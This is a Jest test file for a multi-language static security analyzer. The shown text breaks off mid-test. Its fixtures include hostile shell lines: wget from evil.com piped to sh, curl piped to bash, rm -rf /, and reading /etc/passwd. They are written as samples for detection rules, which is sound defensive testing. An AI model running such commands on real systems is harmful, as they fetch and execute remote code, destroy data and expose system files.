const fs = require('fs');
const path = require('path');

jest.mock('../../src/utils/UltraWorkUtils', () => ({
  splitLines: jest.fn((c) => (c || '').replace(/\r\n/g, '\n').split('\n'))
}));

jest.mock('../../src/utils/SafeExec', () => ({
  safeExecSync: jest.fn()
}));

describe('StaticAnalyzer', () => {
  let StaticAnalyzer;
  let analyzer;
  let mockSafeExec;

  beforeAll(() => {
    StaticAnalyzer = require('../../src/skills/security/StaticAnalyzer').StaticAnalyzer;
  });

  beforeEach(() => {
    jest.spyOn(fs, 'existsSync').mockReturnValue(true);
    jest.spyOn(fs, 'mkdirSync').mockImplementation(() => {});
    jest.spyOn(fs, 'writeFileSync').mockImplementation(() => {});
    jest.spyOn(fs, 'unlinkSync').mockImplementation(() => {});
    jest.spyOn(fs, 'readFileSync').mockReturnValue('');
    jest.spyOn(fs, 'readdirSync').mockReturnValue([]);
    jest.spyOn(fs, 'statSync').mockReturnValue({ isFile: () => false });
    mockSafeExec = require('../../src/utils/SafeExec').safeExecSync;
    mockSafeExec.mockReset();
    mockSafeExec.mockImplementation(() => '');
    analyzer = new StaticAnalyzer({ tempDir: '/tmp/test-analysis' });
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  /* ========== CONSTRUCTOR ========== */
  describe('constructor', () => {
    it('sets default tempDir when not provided', () => {
      jest.spyOn(process, 'cwd').mockReturnValue('/test');
      const a = new StaticAnalyzer();
      expect(a.tempDir).toBe(path.join('/test', 'temp', 'analysis'));
    });

    it('uses provided tempDir', () => {
      expect(analyzer.tempDir).toBe('/tmp/test-analysis');
    });

    it('sets default ESLint config with security rules', () => {
      const config = analyzer.eslintConfig;
      expect(config.env).toEqual({ node: true, es2021: true });
      expect(config.rules['no-eval']).toBe('error');
      expect(config.rules['no-implied-eval']).toBe('error');
      expect(config.rules['no-new-func']).toBe('error');
      expect(config.rules['no-proto']).toBe('error');
    });

    it('sets default Bandit config', () => {
      const config = analyzer.banditConfig;
      expect(config.exclude_dirs).toContain('tests');
      expect(config.tests).toContain('B201');
      expect(config.severity).toBe('medium');
    });

    it('creates tempDir if it does not exist', () => {
      fs.existsSync.mockReturnValue(false);
      new StaticAnalyzer({ tempDir: '/tmp/new-dir' });
      expect(fs.mkdirSync).toHaveBeenCalledWith('/tmp/new-dir', { recursive: true });
    });
  });

  /* ========== JAVASCRIPT ========== */
  describe('analyzeJavaScript', () => {
    it('detects eval as error', async () => {
      const res = await analyzer.analyzeJavaScript('eval("alert(1)")');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'NO_EVAL', severity: 'error' })
        ])
      );
      expect(res.language).toBe('javascript');
    });

    it('detects new Function as error', async () => {
      const res = await analyzer.analyzeJavaScript('const f = new Function("return 1")');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'NO_DYNAMIC_FUNCTION', severity: 'error' })
        ])
      );
    });

    it('detects document.write as error', async () => {
      const res = await analyzer.analyzeJavaScript('document.write("<script>alert(1)</script>")');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'NO_DOCUMENT_WRITE', severity: 'error' })
        ])
      );
    });

    it('detects innerHTML assignment as error', async () => {
      const res = await analyzer.analyzeJavaScript('el.innerHTML = "<b>bold</b>"');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'NO_INNERHTML', severity: 'error' })
        ])
      );
    });

    it('detects child_process require as error', async () => {
      const res = await analyzer.analyzeJavaScript('const cp = require("child_process")');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'CHILD_PROCESS', severity: 'error' })
        ])
      );
    });

    it('detects console.log as warning', async () => {
      const res = await analyzer.analyzeJavaScript('console.log("debug")');
      expect(res.warnings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'NO_CONSOLE', severity: 'warning' })
        ])
      );
    });

    it('detects string setTimeout as warning', async () => {
      const res = await analyzer.analyzeJavaScript('setTimeout("alert(1)", 100)');
      expect(res.warnings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'NO_STRING_TIMEOUT', severity: 'warning' })
        ])
      );
    });

    it('detects string setInterval as warning', async () => {
      const res = await analyzer.analyzeJavaScript('setInterval("doSomething()", 1000)');
      expect(res.warnings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'NO_STRING_INTERVAL', severity: 'warning' })
        ])
      );
    });

    it('detects location change as warning', async () => {
      const res = await analyzer.analyzeJavaScript('document.location = "http://evil.com"');
      expect(res.warnings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'NO_LOCATION_CHANGE', severity: 'warning' })
        ])
      );
    });

    it('detects http:// usage as info', async () => {
      const res = await analyzer.analyzeJavaScript('fetch("http://example.com")');
      expect(res.info).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'HTTP_URL', severity: 'info' })
        ])
      );
    });

    it('detects Math.random as info', async () => {
      const res = await analyzer.analyzeJavaScript('const r = Math.random()');
      expect(res.info).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'WEAK_RANDOM', severity: 'info' })
        ])
      );
    });

    it('detects var usage as suggestion', async () => {
      const res = await analyzer.analyzeJavaScript('var x = 1');
      expect(res.suggestions).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'USE_LET_CONST' })
        ])
      );
    });

    it('returns clean results for safe JavaScript', async () => {
      const res = await analyzer.analyzeJavaScript('const x = 1; let y = 2;');
      expect(res.errors).toHaveLength(0);
      expect(res.warnings).toHaveLength(0);
      expect(res.score).toBe(100);
      expect(res.riskLevel).toBe('minimal');
    });

    it('handles empty code', async () => {
      const res = await analyzer.analyzeJavaScript('');
      expect(res.errors).toHaveLength(0);
      expect(res.score).toBe(100);
    });

    it('runs ESLint when available', async () => {
      mockSafeExec.mockReturnValue(JSON.stringify([{ messages: [
        { ruleId: 'no-eval', message: 'eval is bad', severity: 2, line: 1, column: 1 }
      ]}]));
      const res = await analyzer.analyzeJavaScript('eval("x")');
      expect(res.errors.some((e) => e.rule === 'no-eval')).toBe(true);
    });

    it('skips ESLint when not available', async () => {
      mockSafeExec.mockImplementation(() => { throw new Error('eslint not found'); });
      const res = await analyzer.analyzeJavaScript('eval("x")');
      expect(res.errors.some((e) => e.rule === 'NO_EVAL')).toBe(true);
    });
  });

  /* ========== PYTHON ========== */
  describe('analyzePython', () => {
    it('detects exec() as error', async () => {
      const res = await analyzer.analyzePython('exec("print(1)")');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'NO_EXEC', severity: 'error' })
        ])
      );
      expect(res.language).toBe('python');
    });

    it('detects eval() as error', async () => {
      const res = await analyzer.analyzePython('eval("1+1")');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'NO_EVAL', severity: 'error' })
        ])
      );
    });

    it('detects __import__() as error', async () => {
      const res = await analyzer.analyzePython('mod = __import__("os")');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'NO_DYNAMIC_IMPORT', severity: 'error' })
        ])
      );
    });

    it('detects subprocess.call as error', async () => {
      const res = await analyzer.analyzePython('subprocess.call(["ls"])');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'SUBPROCESS_CALL', severity: 'error' })
        ])
      );
    });

    it('detects subprocess.Popen as error', async () => {
      const res = await analyzer.analyzePython('subprocess.Popen(["cat", "/etc/passwd"])');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'SUBPROCESS_CALL', severity: 'error' })
        ])
      );
    });

    it('detects os.system as error', async () => {
      const res = await analyzer.analyzePython('os.system("rm -rf /")');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'OS_SYSTEM', severity: 'error' })
        ])
      );
    });

    it('detects pickle.load as error', async () => {
      const res = await analyzer.analyzePython('data = pickle.load(open("file", "rb"))');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'PICKLE_LOADS', severity: 'error' })
        ])
      );
    });

    it('detects pickle.loads as error', async () => {
      const res = await analyzer.analyzePython('data = pickle.loads(payload)');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'PICKLE_LOADS', severity: 'error' })
        ])
      );
    });

    it('detects yaml.load as error (not safe_load)', async () => {
      const res = await analyzer.analyzePython('config = yaml.load(content)');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'YAML_UNSAFE_LOAD', severity: 'error' })
        ])
      );
    });

    it('detects open for write as warning', async () => {
      const res = await analyzer.analyzePython('f = open("/tmp/x", "w")');
      expect(res.warnings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'FILE_WRITE', severity: 'warning' })
        ])
      );
    });

    it('detects requests.get as warning', async () => {
      const res = await analyzer.analyzePython('r = requests.get("http://example.com")');
      expect(res.warnings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'HTTP_REQUEST', severity: 'warning' })
        ])
      );
    });

    it('detects print as info', async () => {
      const res = await analyzer.analyzePython('print("hello")');
      expect(res.info).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'HAS_PRINT', severity: 'info' })
        ])
      );
    });

    it('detects bare except as info', async () => {
      const res = await analyzer.analyzePython('try:\n  x = 1\nexcept:\n  pass');
      expect(res.info).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'BARE_EXCEPT', severity: 'info' })
        ])
      );
    });

    it('detects wildcard import as suggestion', async () => {
      const res = await analyzer.analyzePython('from os import *');
      expect(res.suggestions).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'NO_WILDCARD_IMPORT' })
        ])
      );
    });

    it('returns clean for safe Python code', async () => {
      const res = await analyzer.analyzePython('import os\nx = 1\nprint(x)');
      expect(res.errors).toHaveLength(0);
    });

    it('runs Bandit when available', async () => {
      mockSafeExec.mockReturnValue(JSON.stringify({ results: [
        { test_id: 'B201', issue_text: 'exec used', issue_severity: 'HIGH', line_number: 5, issue_confidence: 'HIGH' }
      ]}));
      const res = await analyzer.analyzePython('exec("x")');
      expect(res.errors.some((e) => e.rule === 'B201')).toBe(true);
    });

    it('skips Bandit when not available', async () => {
      mockSafeExec.mockImplementation(() => { throw new Error('bandit not found'); });
      const res = await analyzer.analyzePython('exec("x")');
      expect(res.errors.some((e) => e.rule === 'NO_EXEC')).toBe(true);
    });
  });

  /* ========== SHELL ========== */
  describe('analyzeShell', () => {
    it('detects rm -rf as error', async () => {
      const res = await analyzer.analyzeShell('rm -rf /');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'RECURSIVE_DELETE', severity: 'error' })
        ])
      );
      expect(res.language).toBe('shell');
    });

    it('detects chmod 777 as error', async () => {
      const res = await analyzer.analyzeShell('chmod 777 script.sh');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'DANGEROUS_CHMOD', severity: 'error' })
        ])
      );
    });

    it('detects pipe wget to sh as error', async () => {
      const res = await analyzer.analyzeShell('wget http://evil.com/script.sh | sh');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'PIPE_TO_SHELL', severity: 'error' })
        ])
      );
    });

    it('detects pipe curl to bash as error', async () => {
      const res = await analyzer.analyzeShell('curl https://example.com/x | bash');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'PIPE_TO_SHELL', severity: 'error' })
        ])
      );
    });

    it('detects variable expansion as warning', async () => {
      const res = await analyzer.analyzeShell('echo "${USER_DATA}"');
      expect(res.warnings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'VARIABLE_EXPANSION', severity: 'warning' })
        ])
      );
    });

    it('detects eval in shell as warning', async () => {
      const res = await analyzer.analyzeShell('eval "ls"');
      expect(res.warnings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'NO_EVAL', severity: 'warning' })
        ])
      );
    });

    it('returns clean for safe shell code', async () => {
      const res = await analyzer.analyzeShell('echo "hello"\nls -la');
      expect(res.errors).toHaveLength(0);
    });
  });

  /* ========== JAVA ========== */
  describe('analyzeJava', () => {
    it('detects Runtime.exec as error', async () => {
      const res = await analyzer.analyzeJava('Runtime.getRuntime().exec("ls")');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'RUNTIME_EXEC', severity: 'error' })
        ])
      );
      expect(res.language).toBe('java');
    });

    it('detects ProcessBuilder as error', async () => {
      const res = await analyzer.analyzeJava('new ProcessBuilder("cmd")');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'PROCESS_BUILDER', severity: 'error' })
        ])
      );
    });

    it('detects ObjectInputStream as error', async () => {
      const res = await analyzer.analyzeJava('new ObjectInputStream(input)');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'UNSAFE_DESERIALIZATION', severity: 'error' })
        ])
      );
    });

    it('detects ScriptEngine as error', async () => {
      const res = await analyzer.analyzeJava('new ScriptEngineManager().getEngineByName("js")');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'SCRIPT_ENGINE', severity: 'error' })
        ])
      );
    });

    it('detects XML parsing classes as error', async () => {
      const res = await analyzer.analyzeJava('SAXParser parser = SAXParserFactory.newInstance().newSAXParser()');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'XML_PARSING', severity: 'error' })
        ])
      );
    });

    it('detects System.exit as warning', async () => {
      const res = await analyzer.analyzeJava('System.exit(1)');
      expect(res.warnings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'SYSTEM_EXIT', severity: 'warning' })
        ])
      );
    });

    it('detects System.out.print as info', async () => {
      const res = await analyzer.analyzeJava('System.out.println("hello")');
      expect(res.info).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'SYSTEM_OUT', severity: 'info' })
        ])
      );
    });

    it('detects empty catch as info', async () => {
      const res = await analyzer.analyzeJava('try { x=1; } catch(Exception e) { }');
      expect(res.info).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'EMPTY_CATCH', severity: 'info' })
        ])
      );
    });

    it('returns clean for safe Java code', async () => {
      const res = await analyzer.analyzeJava('public class Test { public static void main(String[] args) { } }');
      expect(res.errors).toHaveLength(0);
    });
  });

  /* ========== GO ========== */
  describe('analyzeGo', () => {
    it('detects os/exec import pattern as error', async () => {
      const res = await analyzer.analyzeGo('import "os/exec"\nout, err := exec.Command("ls").Output()');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'EXEC_COMMAND', severity: 'error' })
        ])
      );
      expect(res.language).toBe('go');
    });

    it('detects os.Exec as error', async () => {
      const res = await analyzer.analyzeGo('os.Exec()');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'OS_EXEC', severity: 'error' })
        ])
      );
    });

    it('detects unsafe.Pointer as error', async () => {
      const res = await analyzer.analyzeGo('ptr := unsafe.Pointer(&x)');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'UNSAFE_POINTER', severity: 'error' })
        ])
      );
    });

    it('detects syscall as error', async () => {
      const res = await analyzer.analyzeGo('syscall.Kill(pid, syscall.SIGTERM)');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'SYSCALL', severity: 'error' })
        ])
      );
    });

    it('detects reflect unsafe as error', async () => {
      const res = await analyzer.analyzeGo('v := reflect.ValueOf(x).Interface()');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'REFLECT_UNSAFE', severity: 'error' })
        ])
      );
    });

    it('detects panic as warning', async () => {
      const res = await analyzer.analyzeGo('panic("unexpected")');
      expect(res.warnings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'PANIC_USAGE', severity: 'warning' })
        ])
      );
    });

    it('detects fmt.Print as info', async () => {
      const res = await analyzer.analyzeGo('fmt.Println("hello")');
      expect(res.info).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'FMT_PRINT', severity: 'info' })
        ])
      );
    });

    it('returns clean for safe Go code', async () => {
      const res = await analyzer.analyzeGo('package main\nimport "fmt"\nfunc main() {}');
      expect(res.errors).toHaveLength(0);
    });
  });

  /* ========== RUST ========== */
  describe('analyzeRust', () => {
    it('detects unsafe block as error', async () => {
      const res = await analyzer.analyzeRust('unsafe { *ptr = 1; }');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'UNSAFE_BLOCK', severity: 'error' })
        ])
      );
      expect(res.language).toBe('rust');
    });

    it('detects std::process::Command as error', async () => {
      const res = await analyzer.analyzeRust('let cmd = std::process::Command::new("ls")');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'PROCESS_COMMAND', severity: 'error' })
        ])
      );
    });

    it('detects transmute as error', async () => {
      const res = await analyzer.analyzeRust('let x = transmute<u32, f32>(val)');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'TRANSMUTE', severity: 'error' })
        ])
      );
    });

    it('detects raw pointer as error', async () => {
      const res = await analyzer.analyzeRust('let ptr = &val as *const i32;\n// raw ptr usage');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'RAW_POINTER', severity: 'error' })
        ])
      );
    });

    it('detects unwrap() as warning', async () => {
      const res = await analyzer.analyzeRust('let x = result.unwrap()');
      expect(res.warnings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'UNWRAP_USAGE', severity: 'warning' })
        ])
      );
    });

    it('detects panic! as warning', async () => {
      const res = await analyzer.analyzeRust('panic!("error")');
      expect(res.warnings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'PANIC_MACRO', severity: 'warning' })
        ])
      );
    });

    it('detects println! as warning', async () => {
      const res = await analyzer.analyzeRust('println!("hello")');
      expect(res.warnings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'PRINTLN_USAGE', severity: 'info' })
        ])
      );
    });

    it('returns clean for safe Rust code', async () => {
      const res = await analyzer.analyzeRust('fn main() { let x = 1; }');
      expect(res.errors).toHaveLength(0);
    });
  });

  /* ========== C++ ========== */
  describe('analyzeCpp', () => {
    it('detects system() as error', async () => {
      const res = await analyzer.analyzeCpp('system("ls")');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'SYSTEM_CALL', severity: 'error' })
        ])
      );
      expect(res.language).toBe('cpp');
    });

    it('detects exec functions as error', async () => {
      const res = await analyzer.analyzeCpp('execl("/bin/sh", "sh", NULL)');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'EXEC_CALL', severity: 'error' })
        ])
      );
    });

    it('detects strcpy as error', async () => {
      const res = await analyzer.analyzeCpp('strcpy(buf, input)');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'STRCPY', severity: 'error' })
        ])
      );
    });

    it('detects strcat as error', async () => {
      const res = await analyzer.analyzeCpp('strcat(buf, suffix)');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'STRCAT', severity: 'error' })
        ])
      );
    });

    it('detects sprintf as error', async () => {
      const res = await analyzer.analyzeCpp('sprintf(buf, "%s", input)');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'SPRINTF', severity: 'error' })
        ])
      );
    });

    it('detects gets as error', async () => {
      const res = await analyzer.analyzeCpp('gets(buffer)');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'GETS', severity: 'error' })
        ])
      );
    });

    it('detects malloc as error', async () => {
      const res = await analyzer.analyzeCpp('int* p = (int*)malloc(10 * sizeof(int))');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'MALLOC', severity: 'warning' })
        ])
      );
    });

    it('detects reinterpret_cast as warning', async () => {
      const res = await analyzer.analyzeCpp('auto p = reinterpret_cast<int*>(addr)');
      expect(res.warnings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'REINTERPRET_CAST', severity: 'warning' })
        ])
      );
    });

    it('detects const_cast as warning', async () => {
      const res = await analyzer.analyzeCpp('auto p = const_cast<int*>(addr)');
      expect(res.warnings).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'CONST_CAST', severity: 'warning' })
        ])
      );
    });

    it('detects cout/printf as info', async () => {
      const res = await analyzer.analyzeCpp('std::cout << "hello" << std::endl');
      expect(res.info).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'IO_OPERATIONS', severity: 'info' })
        ])
      );
    });

    it('returns clean for safe C++ code', async () => {
      const res = await analyzer.analyzeCpp('#include <iostream>\nint main() { return 0; }');
      expect(res.errors).toHaveLength(0);
    });

    it('handles .c files using C++ analyzer', async () => {
      const res = await analyzer.analyzeCpp('gets(buffer)', 'code.c');
      expect(res.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ rule: 'GETS', severity: 'error' })
        ])
      );
    });
  });

  /* ========== SCORE CALCULATION ========== */
  describe('score calculation', () => {
    it('starts at 100 and deducts 15 per error', async () => {
      const res = await analyzer.analyzeJavaScript('eval(x)');
      expect(res.errors.length).toBe(2);
      expect(res.score).toBe(70);
    });

    it('deducts 5 per warning', async () => {
      const res = await analyzer.analyzeJavaScript('console.log("a")\nconsole.log("b")');
      expect(res.warnings.length).toBeGreaterThanOrEqual(1);
      expect(res.score).toBeLessThan(100);
      expect(res.score).toBeGreaterThanOrEqual(85);
    });

    it('deducts 1 per info', async () => {
      const res = await analyzer.analyzeJavaScript('"http://example.com"');
      expect(res.score).toBe(99);
      expect(res.riskLevel).toBe('minimal');
    });

    it('caps score at 0 minimum', async () => {
      const res = await analyzer.analyzeJavaScript('eval("1")\neval("2")\neval("3")\neval("4")\neval("5")\neval("6")\neval("7")\neval("8")');
      expect(res.score).toBe(0);
      expect(res.riskLevel).toBe('high');
    });

    it('high risk for score < 50', async () => {
      const res = await analyzer.analyzeJavaScript('eval("1")\neval("2")\neval("3")');
      expect(res.score).toBe(10);
      expect(res.riskLevel).toBe('high');
    });

    it('medium risk for score 50-69', async () => {
      const res = {
        errors: [{ rule: 'X', severity: 'error' }, { rule: 'Y', severity: 'error' }],
        warnings: [{ rule: 'Z', severity: 'warning' }],
        info: [],
        suggestions: []
      };
      analyzer._calculateScore(res);
      expect(res.score).toBe(65);
      expect(res.riskLevel).toBe('medium');
    });

    it('low risk for score 70-84', () => {
      const res = { errors: [], warnings: [], info: [], suggestions: [] };
      analyzer._calculateScore(res);
      expect(res.riskLevel).toBe('minimal');
    });
  });

  /* ========== ESLINT INTEGRATION ========== */
  describe('_isESLintAvailable', () => {
    it('returns true when safeExecSync succeeds', () => {
      mockSafeExec.mockReturnValue('v8.0.0');
      expect(analyzer._isESLintAvailable()).toBe(true);
      expect(mockSafeExec).toHaveBeenCalledWith('eslint', ['--version'], { stdio: 'ignore' });
    });

    it('returns false when safeExecSync throws', () => {
      mockSafeExec.mockImplementation(() => { throw new Error('not found'); });
      expect(analyzer._isESLintAvailable()).toBe(false);
    });
  });

  describe('_runESLint', () => {
    beforeEach(() => {
      fs.existsSync.mockReturnValue(true);
    });

    it('writes temp files and parses eslint json output', async () => {
      mockSafeExec.mockReturnValue(JSON.stringify([{ messages: [
        { ruleId: 'no-eval', message: 'eval is bad', severity: 2, line: 1, column: 1 },
        { ruleId: 'no-console', message: 'no console', severity: 1, line: 2, column: 1 }
      ]}]));

      const res = await analyzer._runESLint('test code', 'test.js');

      expect(fs.writeFileSync).toHaveBeenCalledTimes(2);
      expect(fs.unlinkSync).toHaveBeenCalledTimes(2);
      expect(res.errors).toHaveLength(1);
      expect(res.errors[0].rule).toBe('no-eval');
      expect(res.warnings).toHaveLength(1);
      expect(res.warnings[0].rule).toBe('no-console');
    });

    it('catches errors and returns empty results', async () => {
      mockSafeExec.mockImplementation(() => { throw new Error('exec failed'); });
      const res = await analyzer._runESLint('bad code', 'bad.js');
      expect(res.errors).toHaveLength(0);
      expect(res.warnings).toHaveLength(0);
    });

    it('handles eslint with no ruleId', async () => {
      mockSafeExec.mockReturnValue(JSON.stringify([{ messages: [
        { message: 'Parsing error', severity: 2, line: 1, column: 1 }
      ]}]));
      const res = await analyzer._runESLint('invalid syntax {{{', 'syntax.js');
      expect(res.errors).toHaveLength(1);
      expect(res.errors[0].rule).toBe('ESLINT');
    });
  });

  /* ========== BANDIT INTEGRATION ========== */
  describe('_isBanditAvailable', () => {
    it('returns true when safeExecSync succeeds', () => {
      mockSafeExec.mockReturnValue('1.7.0');
      expect(analyzer._isBanditAvailable()).toBe(true);
      expect(mockSafeExec).toHaveBeenCalledWith('bandit', ['--version'], { stdio: 'ignore' });
    });

    it('returns false when safeExecSync throws', () => {
      mockSafeExec.mockImplementation(() => { throw new Error('not found'); });
      expect(analyzer._isBanditAvailable()).toBe(false);
    });
  });

  describe('_runBandit', () => {
    it('writes temp file and parses bandit json output', async () => {
      mockSafeExec.mockReturnValue(JSON.stringify({ results: [
        { test_id: 'B201', issue_text: 'exec used', issue_severity: 'HIGH', line_number: 5, issue_confidence: 'HIGH' },
        { test_id: 'B301', issue_text: 'pickle', issue_severity: 'MEDIUM', line_number: 10, issue_confidence: 'MEDIUM' }
      ]}));

      const res = await analyzer._runBandit('exec("x")', 'test.py');

      expect(fs.writeFileSync).toHaveBeenCalledTimes(1);
      expect(fs.unlinkSync).toHaveBeenCalledTimes(1);
      expect(res.errors).toHaveLength(1);
      expect(res.errors[0].rule).toBe('B201');
      expect(res.warnings).toHaveLength(1);
      expect(res.warnings[0].rule).toBe('B301');
    });

    it('handles empty results', async () => {
      mockSafeExec.mockReturnValue(JSON.stringify({ results: [] }));
      const res = await analyzer._runBandit('x = 1', 'safe.py');
      expect(res.errors).toHaveLength(0);
      expect(res.warnings).toHaveLength(0);
    });

    it('handles bandit errors gracefully', async () => {
      mockSafeExec.mockImplementation(() => { throw new Error('bandit failed'); });
      const res = await analyzer._runBandit('bad code', 'bad.py');
      expect(res.errors).toHaveLength(0);
      expect(res.warnings).toHaveLength(0);
    });

    it('handles bandit output without results field', async () => {
      mockSafeExec.mockReturnValue(JSON.stringify({ issue: 'no results key' }));
      const res = await analyzer._runBandit('x = 1', 'safe.py');
      expect(res.errors).toHaveLength(0);
      expect(res.warnings).toHaveLength(0);
    });

    it('defaults rule to BANDIT when test_id missing', async () => {
      mockSafeExec.mockReturnValue(JSON.stringify({ results: [
        { issue_text: 'generic issue', issue_severity: 'HIGH', line_number: 3, issue_confidence: 'MEDIUM' }
      ]}));
      const res = await analyzer._runBandit('exec("x")', 'test.py');
      expect(res.errors[0].rule).toBe('BANDIT');
    });
  });

  /* ========== ANALYZE SKILL PACKAGE ========== */
  describe('analyzeSkillPackage', () => {
    it('analyzes all files in a skill directory', async () => {
      fs.readdirSync.mockReturnValue(['main.js', 'util.py', 'script.sh']);
      fs.statSync.mockReturnValue({ isFile: () => true });
      fs.readFileSync
        .mockReturnValueOnce('eval("x")')
        .mockReturnValueOnce('exec("x")')
        .mockReturnValueOnce('rm -rf /');

      const report = await analyzer.analyzeSkillPackage('/some/skill');

      expect(report.files).toHaveLength(3);
      expect(report.summary.filesAnalyzed).toBe(3);
      expect(report.summary.totalErrors).toBeGreaterThanOrEqual(3);
      expect(report.overallScore).toBeDefined();
    });

    it('skips non-supported file extensions', async () => {
      fs.readdirSync.mockReturnValue(['readme.md', 'data.json', 'config.yaml']);
      fs.statSync.mockReturnValue({ isFile: () => true });
      fs.readFileSync.mockReturnValue('content');

      const report = await analyzer.analyzeSkillPackage('/some/skill');
      expect(report.files).toHaveLength(0);
      expect(report.summary.filesAnalyzed).toBe(0);
    });

    it('skips directories', async () => {
      fs.readdirSync.mockReturnValue(['subdir']);
      fs.statSync.mockReturnValue({ isFile: () => false });

      const report = await analyzer.analyzeSkillPackage('/some/skill');
      expect(report.files).toHaveLength(0);
    });

    it('handles readdirSync errors', async () => {
      fs.readdirSync.mockImplementation(() => { throw new Error('permission denied'); });
      const report = await analyzer.analyzeSkillPackage('/restricted');
      expect(report.error).toBe('permission denied');
    });

    it('computes overallScore as minimum across files', async () => {
      fs.readdirSync.mockReturnValue(['a.js', 'b.js']);
      fs.statSync.mockReturnValue({ isFile: () => true });
      fs.readFileSync
        .mockReturnValueOnce('eval("x")')
        .mockReturnValueOnce('const x = 1');

      const report = await analyzer.analyzeSkillPackage('/some/skill');
      expect(report.overallScore).toBe(70);
      expect(report.riskLevel).toBe('low');
    });

    it('analyzes Java files', async () => {
      fs.readdirSync.mockReturnValue(['Main.java']);
      fs.statSync.mockReturnValue({ isFile: () => true });
      fs.readFileSync.mockReturnValue('public class Main {}');
      const spy = jest.spyOn(analyzer, 'analyzeJava').mockResolvedValue({
        filename: 'Main.java', errors: [], warnings: [], info: [], score: 100, riskLevel: 'low', suggestions: []
      });
      const report = await analyzer.analyzeSkillPackage('/some/skill');
      expect(spy).toHaveBeenCalled();
      expect(report.summary.filesAnalyzed).toBe(1);
    });

    it('analyzes Go files', async () => {
      fs.readdirSync.mockReturnValue(['main.go']);
      fs.statSync.mockReturnValue({ isFile: () => true });
      fs.readFileSync.mockReturnValue('package main');
      const spy = jest.spyOn(analyzer, 'analyzeGo').mockResolvedValue({
